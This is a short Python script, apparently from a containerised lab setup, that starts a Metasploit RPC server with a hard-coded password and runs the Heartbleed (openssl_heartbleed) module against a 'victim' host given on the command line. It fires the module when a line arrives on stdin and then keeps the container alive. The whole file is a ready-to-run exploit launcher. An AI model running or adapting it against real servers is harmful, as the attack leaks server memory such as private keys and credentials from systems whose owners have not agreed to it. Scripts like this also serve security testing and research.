import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient
import time

if __name__ == '__main__':

    # start metasploit exploit server
    os.system("./msfrpcd -P password -S")

    victim = sys.argv[1]

    print("INITIALIZING EXPLOIT")

    # connect to metasploit server
    while True:
        try:
            client = MsfRpcClient('password', port=55553, ssl=False)
            print("CONNECTED TO MSFRPC")
            break
        except:
            time.sleep(1)

    # metasploit settings
    exploit = client.modules.use('auxiliary', 'scanner/ssl/openssl_heartbleed')
    exploit['RHOSTS'] = victim

    cid = client.consoles.console().cid

    # start exploit after receiving Stdin line
    sys.stdin.readline()
    print(client.consoles.console(cid).run_module_with_output(exploit))

    # keep container alive after exploit execution
    while True:
        time.sleep(1)
